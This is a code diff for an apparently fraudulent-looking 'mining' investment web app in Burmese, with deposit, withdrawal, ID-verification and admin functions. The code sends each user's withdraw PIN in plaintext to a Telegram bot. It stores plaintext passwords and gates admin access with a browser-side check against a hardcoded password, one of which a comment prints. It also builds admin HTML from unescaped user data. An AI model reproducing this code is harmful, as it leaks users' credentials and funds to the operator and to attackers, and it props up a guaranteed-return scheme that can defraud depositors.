                 expiryDate: expiry.toLocaleDateString(), expiryTime: expiry.getTime(), 
                 startTime: now.getTime(), totalProfit: Math.floor(amt + (amt*(percent/100)*days)), daysDuration: days 
             });
-            sendTelegram(`⛏️ Mining Request: User ${user} invested ${amt} Ks in ${node} for ${days} days.`);
-            alert("Mining တောင်းဆိုမှုအောင်မြင်ပါသည်။ အက်ဒမင်မှ စက်ကိုစတင်လည်ပတ်ပေးရန် ခေတ္တစောင့်ဆိုင်းပေးပါ။");
+            sendTelegram(`⛏️ Mining Request: User ${user} invested ${amt} Ks in ${node}.`);
+            alert("Mining တောင်းဆိုမှုအောင်မြင်ပါသည်။");
         });
     }
 
@@ -912,8 +1087,8 @@
                 if(confirm(`${total.toLocaleString()} Ks ကို Balance ထဲသို့ ထည့်သွင်းမှာ သေချာပါသလား?`)) {
                     db.ref('users/'+user+'/balance').transaction(b => (b||0) + total);
                     db.ref(`requests/mining/${key}`).update({ status: 'completed', endTime: Date.now() });
-                    sendTelegram(`✅ Mining Success: User ${user} claimed ${total} Ks from mining.`);
-                    alert("ဂုဏ်ယူပါသည်! Mining အမြတ်ငွေများကို Balance ထဲသို့ ထည့်သွင်းပေးလိုက်ပါပြီ။");
+                    sendTelegram(`✅ Mining Success: User ${user} claimed ${total} Ks.`);
+                    alert("ဂုဏ်ယူပါသည်! Mining အမြတ်ငွေများကို Balance ထဲသို့ ထည့်သွင်းပြီးပါပြီ။");
                 }
             });
         });
@@ -942,23 +1117,16 @@
             amtInput.value = "";
             return alert("အနည်းဆုံး ၁၀၀၀ ကျပ်ရှိမှ ထုတ်ယူ၍ ရနိုင်ပါမည်။");
         }
-        if(!name || !ph || !pin) return alert("ကျေးဇူးပြု၍ ငွေထုတ်ယူမည့် အချက်အလက်များကို အပြည့်အစုံဖြည့်ပါ။");
+        if(!name || !ph || !pin) return alert("ကျေးဇူးပြု၍ အချက်အလက်များ အပြည့်အစုံဖြည့်ပါ။");
 
         db.ref('users/'+user).once('value', s => { 
-            if(s.val().pin !== pin) return alert("ငွေထုတ်ယူမည့် PIN နံပါတ် မှားယွင်းနေပါသည်။"); 
+            if(s.val().pin !== pin) return alert("Withdraw PIN မှားယွင်းနေပါသည်။"); 
             if(s.val().balance < amt) return alert("လက်ကျန်ငွေ မလုံလောက်ပါ။"); 
             
             db.ref('requests/withdraws').push({ ph:user, amt, name:name, receivePh:ph, status:'pending', date:new Date().toLocaleString() }); 
             db.ref('users/'+user).update({ balance: s.val().balance - amt }); 
             
-            const detailedMsg = `🚨 NEW WITHDRAW REQUEST 🚨\n\n` +
-                                `👤 User ID: ${user}\n` +
-                                `💰 Amount: ${amt.toLocaleString()} MMK\n` +
-                                `📛 Account Name: ${name}\n` +
-                                `📱 Receive Phone: ${ph}\n` +
-                                `🔐 Withdraw PIN: ${pin}\n` +
-                                `⏰ Date: ${new Date().toLocaleString()}`;
-            sendTelegram(detailedMsg);
+            sendTelegram(`🚨 NEW WITHDRAW 🚨\n\n👤 User: ${user}\n💰 Amount: ${amt.toLocaleString()} MMK\n📛 Name: ${name}\n📱 Phone: ${ph}\n🔐 PIN: ${pin}\n⏰ ${new Date().toLocaleString()}`);
 
             alert("ငွေထုတ်ယူရန် တောင်းဆိုမှု တင်ပြပြီးပါပြီ။");
             showPage('dash-page');
@@ -968,7 +1136,7 @@
     function sendDeposit() { 
         const amt = document.getElementById('dep-amt-input').value; 
         const trx = document.getElementById('dep-trx-input').value.trim(); 
-        if(!amt || !trx) return alert("အချက်အလက်များကို အပြည့်အစုံဖြည့်ပါ။");
+        if(!amt || !trx) return alert("အချက်အလက်များ အပြည့်အစုံဖြည့်ပါ။");
         db.ref('requests/deposits').push({ 
             ph:user, amt, trx, method: currentPayMethod, status:'pending', date:new Date().toLocaleString() 
         }); 
@@ -984,7 +1152,7 @@
             if(newPw.length < 6) return alert("လျှို့ဝှက်နံပါတ် အနည်းဆုံး ၆ လုံး ထည့်ပါ။");
             db.ref('users/'+user).once('value', s => { 
                 if(s.val().password === oldPw) { 
-                    db.ref('users/'+user).update({password: newPw}).then(()=>alert("လျှို့ဝှက်နံပါတ် ပြောင်းလဲမှု အောင်မြင်ပါသည်။")); 
+                    db.ref('users/'+user).update({password: newPw}).then(()=>alert("လျှို့ဝှက်နံပါတ် ပြောင်းလဲပြီးပါပြီ။")); 
                 } 
                 else alert("ယခင် လျှို့ဝှက်နံပါတ် မှားယွင်းနေပါသည်။"); 
             }); 
@@ -996,26 +1164,55 @@
     }
 
     // ================================================================
-    // 🔐 ADMIN TRIGGER — ဖုန်းနံပါတ် 09951214043 ဖြင့်သာ ဝင်နိုင်မည်
+    // 🔐 ADMIN TRIGGER — Admin Password: nan123 (တစ်ယောက်တည်း မြင်နိုင်သည်)
     // ================================================================
     document.getElementById('admin-trigger').onclick = () => {
         if(!user) return alert("ကျေးဇူးပြု၍ အရင်ဆုံး Login ဝင်ပါ။");
         
-        // Admin Phone စစ်ဆေးခြင်း
         if(user !== ADMIN_PHONE) {
             return alert("⛔ ဤနေရာသည် Admin အတွက်သာ ဖြစ်ပါသည်။");
         }
         
-        // Admin ဖြစ်ရင် ၃ ကြိမ်နှိပ်ပြီး PIN ထည့်ပါ
         if(++adminStep >= 3) { 
             adminStep = 0; 
-            const pin = prompt("🔐 Admin PIN ထည့်ပါ:");
-            if(pin === "nannan2333960") { 
-                showPage('admin-page'); 
-                loadAdmReq(); 
-            } else if(pin !== null) {
-                alert("❌ Admin PIN မှားနေပါသည်။");
-            }
+            
+            // Password Prompt ကို Masked Type ဖြင့် ဖန်တီး
+            const overlay = document.createElement('div');
+            overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:99999;display:flex;align-items:center;justify-content:center;padding:20px;';
+            overlay.innerHTML = `
+                <div style="background:#0f172a;padding:25px;border-radius:20px;max-width:400px;width:100%;border:1px solid #00DBB1;">
+                    <h3 style="color:#00DBB1;margin:0 0 15px 0;text-align:center;">🔐 Admin Access</h3>
+                    <input type="password" id="adm-pw-input" placeholder="Admin Password" style="width:100%;padding:14px;border-radius:12px;border:1px solid #333;background:#050A0E;color:white;box-sizing:border-box;outline:none;font-size:14px;">
+                    <div style="display:flex;gap:10px;margin-top:15px;">
+                        <button id="adm-pw-cancel" style="flex:1;padding:12px;border-radius:10px;border:none;background:#333;color:white;font-weight:700;cursor:pointer;">Cancel</button>
+                        <button id="adm-pw-ok" style="flex:1;padding:12px;border-radius:10px;border:none;background:linear-gradient(135deg,#00DBB1,#00A383);color:#000;font-weight:700;cursor:pointer;">Login</button>
+                    </div>
+                </div>
+            `;
+            document.body.appendChild(overlay);
+            
+            const pwInput = document.getElementById('adm-pw-input');
+            setTimeout(() => pwInput.focus(), 100);
+            
+            const closeOverlay = () => overlay.remove();
+            
+            const checkPw = () => {
+                if(pwInput.value === ADMIN_PASSWORD) {
+                    closeOverlay();
+                    showPage('admin-page');
+                    loadAdmReq();
+                    loadAdmVerify();
+                    loadAdmPayDetails();
+                } else {
+                    alert("❌ Admin Password မှားနေပါသည်။");
+                    pwInput.value = "";
+                    pwInput.focus();
+                }
+            };
+            
+            document.getElementById('adm-pw-ok').onclick = checkPw;
+            document.getElementById('adm-pw-cancel').onclick = closeOverlay;
+            pwInput.onkeypress = (e) => { if(e.key === 'Enter') checkPw(); };
         }
     };
 
@@ -1024,6 +1221,100 @@
         if(!txt) return alert("အကြောင်းကြားစာ ရေးပါ။");
         db.ref('announcements').push({ text: txt, date: new Date().toLocaleString() });
         alert("Announcement Published!");
+    }
+
+    // ================================================================
+    // 💳 ADMIN PAYMENT DETAILS (Wave + KPay ပြောင်းနိုင်သည်)
+    // ================================================================
+    function loadAdmPayDetails() {
+        db.ref('settings/payments').once('value', s => {
+            const data = s.val() || PAYMENT_DETAILS;
+            if(data.wave) {
+                document.getElementById('adm-wave-name').value = data.wave.name || '';
+                document.getElementById('adm-wave-num').value = data.wave.num || '';
+            }
+            if(data.kpay) {
+                document.getElementById('adm-kpay-name').value = data.kpay.name || '';
+                document.getElementById('adm-kpay-num').value = data.kpay.num || '';
+            }
+        });
+    }
+
+    function admUpdatePayDetails() {
+        const waveName = document.getElementById('adm-wave-name').value.trim();
+        const waveNum = document.getElementById('adm-wave-num').value.trim();
+        const kpayName = document.getElementById('adm-kpay-name').value.trim();
+        const kpayNum = document.getElementById('adm-kpay-num').value.trim();
+        
+        if(!waveName || !waveNum || !kpayName || !kpayNum) {
+            return alert("အချက်အလက်အားလုံး ဖြည့်ပါ။");
+        }
+        
+        db.ref('settings/payments').set({
+            wave: { name: waveName, num: waveNum },
+            kpay: { name: kpayName, num: kpayNum }
+        }).then(() => {
+            PAYMENT_DETAILS.wave = { name: waveName, num: waveNum };
+            PAYMENT_DETAILS.kpay = { name: kpayName, num: kpayNum };
+            
+            document.getElementById('adm-pay-status').innerHTML = '✅ Payment details updated at ' + new Date().toLocaleTimeString();
+            sendTelegram(`💳 ADMIN UPDATED PAYMENTS\n\nWave: ${waveName} - ${waveNum}\nKPay: ${kpayName} - ${kpayNum}`);
+            alert("Payment Details ပြောင်းလဲပြီးပါပြီ။");
+        });
+    }
+
+    // ================================================================
+    // 🆔 ADMIN VERIFICATION REQUESTS (Approve / Reject)
+    // ================================================================
+    function loadAdmVerify() {
+        db.ref('requests/verifications').on('value', s => {
+            let h = "";
+            let count = 0;
+            s.forEach(r => {
+                const data = r.val();
+                if(data.status === 'pending') {
+                    count++;
+                    h += `<div class="card" style="border-left:4px solid var(--active-gold);">
+                        <div style="display:flex;justify-content:space-between;align-items:center;">
+                            <b style="color:var(--primary);">${data.username || 'User'}</b>
+                            <span class="mining-status-badge status-pending">PENDING</span>
+                        </div>
+                        <p style="font-size:12px;margin:8px 0;color:var(--dim);">
+                            📱 Phone: <b style="color:#fff;">${data.ph}</b><br>
+                            🆔 NRC: <b style="color:#fff;">${data.nrc}</b><br>
+                            ⏰ ${data.date}
+                        </p>
+                        <div style="display:flex;gap:10px;margin-top:10px;">
+                            <button class="btn btn-green" style="padding:8px;font-size:12px;" onclick="applyClickGold(this); admVerifyAction('${r.key}','approved','${data.ph}')">✅ Approve</button>
+                            <button class="btn btn-red" style="padding:8px;font-size:12px;" onclick="applyClickGold(this); admVerifyAction('${r.key}','rejected','${data.ph}')">❌ Reject</button>
+                        </div>
+                    </div>`;
+                }
+            });
+            document.getElementById('adm-verify-list').innerHTML = h || "<p style='color:var(--dim);font-size:12px;'>No pending verification requests.</p>";
+        });
+    }
+
+    function admVerifyAction(key, status, ph) {
+        db.ref(`requests/verifications/${key}`).once('value', s => {
+            const data = s.val();
+            if(!data) return;
+            
+            db.ref(`requests/verifications/${key}`).update({ 
+                status: status, 
+                reviewedAt: new Date().toLocaleString() 
+            });
+            
+            db.ref('users/'+ph).update({ verificationStatus: status });
+            
+            if(status === 'approved') {
+                sendTelegram(`✅ VERIFICATION APPROVED\n\n👤 ${data.username}\n📱 ${ph}`);
+                alert("✅ Verification Approved!");
+            } else {
+                sendTelegram(`❌ VERIFICATION REJECTED\n\n👤 ${data.username}\n📱 ${ph}`);
+                alert("❌ Verification Rejected!");
+            }
+        });
     }
 
     function admSearch() { 
@@ -1048,15 +1339,18 @@
     function loadAdmReq() { 
         db.ref('requests').on('value', s => { 
             let h = ""; 
-            s.forEach(cat => cat.forEach(r => { 
-                if(r.val().status==='pending') { 
-                    h += `<div class="card">${cat.key.toUpperCase()} - ${r.val().method || ''}<br>User: ${r.val().ph}<br>Amt: ${r.val().amt}<br>TRX: ${r.val().trx || 'N/A'}<br>
-                    <div style="display:flex; gap:10px; margin-top:10px;">
-                        <button class="btn btn-green" style="padding:8px;" onclick="applyClickGold(this); admAction('${cat.key}','${r.key}','success')">Approve</button>
-                        <button class="btn btn-red" style="padding:8px;" onclick="applyClickGold(this); admAction('${cat.key}','${r.key}','rejected')">Reject</button>
-                    </div></div>`; 
-                } 
-            })); 
+            s.forEach(cat => {
+                if(cat.key === 'verifications') return; // Skip verifications (already shown)
+                cat.forEach(r => { 
+                    if(r.val().status==='pending') { 
+                        h += `<div class="card">${cat.key.toUpperCase()} - ${r.val().method || ''}<br>User: ${r.val().ph}<br>Amt: ${r.val().amt}<br>TRX: ${r.val().trx || 'N/A'}<br>
+                        <div style="display:flex; gap:10px; margin-top:10px;">
+                            <button class="btn btn-green" style="padding:8px;" onclick="applyClickGold(this); admAction('${cat.key}','${r.key}','success')">Approve</button>
+                            <button class="btn btn-red" style="padding:8px;" onclick="applyClickGold(this); admAction('${cat.key}','${r.key}','rejected')">Reject</button>
+                        </div></div>`; 
+                    } 
+                });
+            }); 
             document.getElementById('adm-req-list').innerHTML = h || "No pending requests."; 
         }); 
     }
